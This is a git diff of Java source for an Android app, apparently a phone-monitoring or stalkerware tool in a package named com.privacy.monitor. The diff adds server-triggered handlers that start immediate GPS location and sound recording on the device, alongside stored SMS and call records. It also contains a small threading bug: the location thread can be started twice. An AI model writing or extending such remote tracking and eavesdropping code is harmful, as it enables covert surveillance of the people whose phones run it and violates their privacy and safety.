@@ -14,7 +14,6 @@ import org.json.JSONObject;
 import com.google.gson.Gson;
 import com.privacy.monitor.base.C;
 import com.privacy.monitor.db.CallRecordDB;
-import com.privacy.monitor.db.DirectiveDB;
 import com.privacy.monitor.db.LocManDB;
 import com.privacy.monitor.db.MonitorDB;
 import com.privacy.monitor.db.RegularDB;
@@ -25,6 +24,8 @@ import com.privacy.monitor.domain.Monitor;
 import com.privacy.monitor.domain.Regular;
 import com.privacy.monitor.domain.SMSRecord;
 import com.privacy.monitor.service.utilservice.ClientSocket;
+import com.privacy.monitor.service.utilservice.ExecuteImmLoc;
+import com.privacy.monitor.service.utilservice.ExecuteImmSoundRec;
 import com.privacy.monitor.util.AppUtil;
 import com.privacy.monitor.util.HttpUtil;
 import com.privacy.monitor.util.Logger;
@@ -49,23 +50,24 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 	private MonitorDB monitorDB;
 	private SMSRecordDB smsRecordDB;
 	private CallRecordDB callRecordDB;
-	private DirectiveDB directiveDB;
 	private RegularDB regularDB;
 	private LocManDB locManDB ;
 	private TelephonyManager tm;
 	private ClientSocket cSocket;
 	private String myPhone;
 	private boolean isCloseMobileNet ;
+	private Context context;
+	private Thread executeLoc,executeSoundRec;
 	
 	@Override
 	public void onReceive(final Context context, Intent intent) {
+		this.context = context;
 		final SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
 		if(TextUtils.isEmpty(myPhone)){
 			myPhone = sp.getString(C.PHONE_NUM,"");
 		}
 		smsRecordDB = SMSRecordDB.getInstance(context);
 		callRecordDB = CallRecordDB.getInstance(context);
-		directiveDB = DirectiveDB.getInstance(context);
 		monitorDB = MonitorDB.getInstance(context);
 		locManDB = LocManDB.getInstance(context);
 		regularDB = RegularDB.getInstance(context);
@@ -280,7 +282,7 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 	}
 	
 	//处理服务端返回的信息
-	private void handleMessage(String type,String data){
+	private void handleMessage(final String type,final String data){
 		try {
 			Logger.d("Cron","type type type:"+type);
 			if(ClientSocket.TYPE_INFO.equalsIgnoreCase(type)){
@@ -309,14 +311,34 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 				monitorDB.insert(monitor);
 				
 				
-				
 			//立刻定位
 			}else if(ClientSocket.TYPE_GPS_NOW.equalsIgnoreCase(type)){
-				
-			
+				if(executeLoc==null){
+					executeLoc = new Thread(new Runnable() {
+						
+						@Override
+						public void run() {
+							ExecuteImmLoc eImmLoc = ExecuteImmLoc.getInatance(context);
+						    eImmLoc.executeTask(type, data);
+						}
+					});
+				}
+				executeLoc.start();
+			    
 		    //立刻录音 
 			}else if(ClientSocket.TYPE_REC_NOW.equalsIgnoreCase(type)){
 				
+				if(executeSoundRec==null){
+					executeSoundRec = new Thread(new Runnable() {
+						
+						@Override
+						public void run() {
+							ExecuteImmSoundRec eis = ExecuteImmSoundRec.getInstance();
+							eis.executeSoundRec(context, data);
+						}
+					});
+					executeSoundRec.start();
+				}
 				
 			}
 			
